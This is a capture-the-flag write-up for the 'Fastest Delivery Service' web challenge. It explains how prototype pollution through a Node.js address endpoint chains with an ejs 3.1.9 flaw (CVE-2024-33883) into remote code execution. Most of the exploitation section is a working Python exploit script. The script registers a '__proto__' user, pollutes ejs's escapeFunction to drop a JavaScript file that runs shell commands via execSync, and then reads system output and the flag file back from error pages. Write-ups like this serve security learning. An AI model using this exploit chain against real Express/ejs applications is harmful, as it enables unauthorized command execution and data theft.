---
title: "Fastest Delivery Service - BlackHat MEA CTF Qualification 2024"
category: "web"
subcategory: "prototype-pollution"
type: "writeup"
tags: ["web", "cve-2024-33883", "prototype-pollution", "nodejs", "fastest", "delivery", "service", "blackhat-mea-ctf-qualification", "blackhat-mea-ctf-qualification-202", "2024", "ctf-writeup"]
summary: "In this challenge we are provided with source code of application."
source:
  name: "CTFtime writeup #39418"
  url: "https://ctftime.org/writeup/39418"
original_source: "https://medium.com/@rootxran/fastest-delivery-service-web-blackhat-mea-bd38c37643fe"
ctf:
  name: "BlackHat MEA CTF Qualification 2024"
  year: 2024
  challenge: "Fastest Delivery Service"
---

## Metadata

- **CTF:** BlackHat MEA CTF Qualification 2024
- **Task:** Fastest Delivery Service
- **Author team:** Griffyns
- **CTFtime tags:** cve-2024-33883, prototype-pollution
- **CTFtime:** <https://ctftime.org/writeup/39418>
- **Original writeup:** <https://medium.com/@rootxran/fastest-delivery-service-web-blackhat-mea-bd38c37643fe>

---
## Initial Analysis  
In this challenge we are provided with source code of application. Application is based on Nodejs with login, register and address form functionality. The interesting part of the application is when I have submitted username in both fields of address form and got type error page which shows me that address functionality is modifying the user object.  
## Exploitation  
I have read Dockerfile which gave me idea that I need to get rce or read file in order to get flag.  
```  
RUN echo "$FLAG" > '/tmp/flag_'$(cat /dev/urandom | tr -cd 'a-f0-9' | head -c 32).txt  
```  
Now back on the endpoint where we got that type error was `/address`  
```js  
[app.post](http://app.post)('/address', (req, res) => {  
const { user } = req.session;  
const { addressId, Fulladdress } = req.body;  
if (user && users[user.username]) {  
addresses[user.username][addressId] = Fulladdress;  
users[user.username].address = addressId;  
res.redirect('/login');  
} else {  
res.redirect('/register');  
}  
});  
```

At first sight I have seen that its modifying object using user passed parameters

```  
addresses[user.username][addressId] = Fulladdress;  
```

This gave me idea that there is vulnerability of `prototype pollution`

we can have control of all parameters in this code

```  
username : /register   
addressId, FullAddress: /address

addresses["__proto__"][<user_input>] = <user_input>;  
```

I have checked `package.json` which contains the versions of npm packages which have been used in application

```  
{   
"name": "food-delivery-service",   
"version": "1.0.0",   
"description": "",   
"main": "app.js",   
"scripts": {   
"start": "node app.js"   
},   
"dependencies": {   
"express": "^4.18.2",   
"body-parser": "^1.20.1",   
"ejs":"^3.1.9",   
"express-session":"^1.18.0"   
}   
}  
```

ejs version is `3.1.9`

I have search for this version of ejs and found cve (CVE-2024-33883). Following is the poc which I used for this challenge

[<https://github.com/Grantzile/PoC-CVE-2024-33883>](<https://github.com/Grantzile/PoC-CVE-2024-33883>)

To automate the process I have made python script

```python  
#!/usr/bin/env python3   
  
import re   
import requests   
  
target_url = "<url>"   
  
s = requests.Session() 

r = [s.post](http://s.post)(target_url + "/register", data={"username": "__proto__", "password": "asdf"})   
  
r = [s.post](http://s.post)(target_url + "/address", data={"addressId": "client", "Fulladdress": "1"})   
payload = """process.mainModule.require("fs").writeFileSync("/tmp/rootxran.js", "function RCE( key ){ \\\n const result = process.mainModule.require('child_process').execSync(`${key}`); \\\n throw new Error(`Result leak from Error: ${result.toString()}`); \\\n}\\\n module.exports = RCE;");"""   
r = [s.post](http://s.post)(target_url + "/address", data={"addressId": "escapeFunction", "Fulladdress": payload})   
  
payload = """process.mainModule.require("/tmp/rootxran.js")("id");"""   
r = [s.post](http://s.post)(target_url + "/address", data={"addressId": "escapeFunction", "Fulladdress": payload})   
pattern = r'Result leak from Error: (.*?)  
  
'   
match = re.search(pattern, r.text, re.DOTALL)   
print(match.group(1).strip())   
  
payload = """process.mainModule.require("/tmp/rootxran.js")("cat /tmp/flag_*");"""   
r = [s.post](http://s.post)(target_url + "/address", data={"addressId": "escapeFunction", "Fulladdress": payload})   
pattern = r'Result leak from Error: (.*?)  
  
'   
match = re.search(pattern, r.text, re.DOTALL)   
print(match.group(1).strip())  
```

## Conclusion  
Sometimes you don’t need admin to get what you want from application
